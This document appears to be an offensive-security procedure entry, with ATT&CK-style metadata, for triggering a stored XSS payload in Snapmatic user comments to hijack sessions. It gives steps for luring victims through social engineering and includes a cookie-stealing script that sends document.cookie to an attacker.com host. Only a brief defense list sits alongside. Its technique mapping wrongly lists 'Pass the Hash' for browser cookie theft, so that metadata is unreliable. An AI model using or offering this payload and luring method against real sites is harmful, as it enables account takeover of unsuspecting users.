---
id: proc-uuid-12347
name: Trigger-XSS-Execution-for-Session-Hijack
tags:
  - xss
  - execution
  - session-hijack
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Pass the Hash]]'
updated_at: '2025-12-13T23:52:25.595Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Pass the Hash]]'
---
# Trigger-XSS-Execution-for-Session-Hijack

## Summary

This procedure triggers the stored XSS payload by viewing the infected comment, executing JavaScript to steal session data or perform other client-side attacks on the victim.

## Description

Once the payload is stored in Snapmatic comments, any user viewing the UGC item will render the unsanitized HTML, executing the script in their browser context. This can lead to cookie theft, keylogging, or redirects, exploiting the trust in UGC platforms.

## Requirements

1. Access to the infected UGC item from a victim session
2. Attacker server to receive exfiltrated data
3. Browser with dev tools for monitoring execution

## Defense

Defensive measures and detection strategies:

- Strict output encoding (e.g., HTML entity encoding) for all rendered comments
- Browser-based CSP enforcement to prevent JS execution
- Anomaly detection on client-side network traffic for unauthorized fetches

## Objectives

1. Execute the payload in a victim browser
2. Capture sensitive data like session tokens
3. Validate impact through received data

## Instructions

### Step 1: Direct Victim to UGC

**Context**: Lure or wait for a target to view the infected content.

Share the link to the Snapmatic item with the malicious comment via social engineering or wait for organic views.

> Victims load the page normally, triggering render.

### Step 2: Monitor Execution

**Context**: Observe JS running in the victim's browser.

In a test scenario, open the page in an incognito window; the payload should execute immediately on comment load.

> Use dev tools console to see alerts or network requests.

### Step 3: Exfiltrate and Hijack

**Context**: Use the executed JS to steal and send session data.

Payload example: `＜script＞document.location='https://attacker.com?'+document.cookie＜/script＞`. Check attacker server logs for incoming data.

> Successful hijack allows replaying stolen cookies for account access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Pass the Hash]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[javascript-execution]]
- [[cookie-theft]]
